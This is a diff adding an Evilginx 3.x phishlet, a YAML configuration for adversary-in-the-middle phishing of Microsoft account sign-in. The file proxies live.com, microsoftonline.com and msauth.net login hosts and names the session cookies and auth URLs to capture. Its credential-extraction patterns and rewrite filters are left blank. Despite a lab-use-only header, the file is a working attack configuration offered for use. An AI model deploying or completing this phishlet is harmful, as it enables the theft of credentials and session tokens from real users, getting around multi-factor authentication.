@@ -1,0 +1,61 @@
+# Evilginx 3.x Phishlet
+# Generated from captured auth flow session
+# AUTHORIZED LAB USE ONLY
+#
+# This phishlet is as complete as the capture metadata allows.
+# You must still manually define:
+#   - sub_filters: JavaScript proxy-rewrite recipes
+#   - credentials[].search: regex patterns for credential extraction
+#
+# Test thoroughly in your lab before any authorized use.
+
+name: 'live'
+min_ver: '3.0.0'
+
+proxy_hosts:
+  - phish_sub: 'login'
+    orig_sub: 'login'
+    domain: 'microsoftonline.com'
+    session: true
+    is_landing: false
+    auto_filter: true
+  - phish_sub: 'login'
+    orig_sub: 'login'
+    domain: 'live.com'
+    session: true
+    is_landing: true
+    auto_filter: true
+  - phish_sub: 'logincdn'
+    orig_sub: 'logincdn'
+    domain: 'msauth.net'
+    session: false
+    is_landing: false
+    auto_filter: true
+
+auth_tokens:
+  - domain: 'microsoftonline.com'
+    keys:
+      - 'fpc'
+      - 'x-ms-gateway-slice'
+  - domain: 'live.com'
+    keys:
+      - 'MSPRequ'
+      - 'uaid'
+      - 'MSPOK'
+      - 'OParams'
+      - 'OParams1'
+
+auth_urls:
+  - '/common/GetCredentialType'
+  - '/oauth20_authorize.srf'
+  - '/checkpassword.srf'
+
+login:
+  domain: 'live.com'
+  path: '/checkpassword.srf'
+
+credentials:
+  []
+
+sub_filters:
+  - '{{PLACEHOLDER}}'
